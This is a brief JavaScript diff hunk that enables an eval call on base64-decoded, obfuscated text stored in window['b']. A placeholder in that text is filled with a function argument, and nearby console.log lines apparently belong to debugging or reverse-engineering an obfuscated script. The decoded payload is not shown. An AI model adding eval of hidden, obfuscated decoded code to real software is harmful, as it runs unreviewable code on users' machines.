@@ -60,7 +60,7 @@ function oo0O0(mw) {
     console.log(Buffer.from(window['b'], `base64`).toString(`binary`))
     console.log(window.f)
     // console.log('f', Buffer.from(window['b'], `base64`).toString(`binary`))
-    // eval(atob(window['b'])[J('0x0', ']dQW')](J('0x1', 'GTu!'), '\x27' + mw + '\x27'));
+    eval(atob(window['b'])[J('0x0', ']dQW')](J('0x1', 'GTu!'), '\x27' + mw + '\x27'));
     return ''
 }
 
